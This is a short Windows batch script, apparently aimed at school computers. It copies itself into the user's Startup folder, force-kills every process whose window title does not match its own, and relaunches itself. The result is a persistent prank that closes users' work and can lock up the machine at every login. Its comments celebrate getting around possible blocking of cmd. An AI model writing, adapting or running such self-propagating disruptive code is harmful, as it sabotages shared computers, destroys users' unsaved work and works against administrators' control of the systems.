@ECHO OFF
COLOR 0A
::Everything is better with color 0a (Matrix)
::School system may update to win10 next year,I have found NO information on whether cmd can be blocked in win10! YAY!
IF NOT EXIST "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\winStat.bat" (
COPY winStat.bat "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\winStat.bat"
)
TITLE winStat
TASKKILL /F /FI "WINDOWTITLE ne winStat"
TITLE HA!
TASKKILL /F /FI "WINDOWTITLE ne HA!"
START winStat.bat
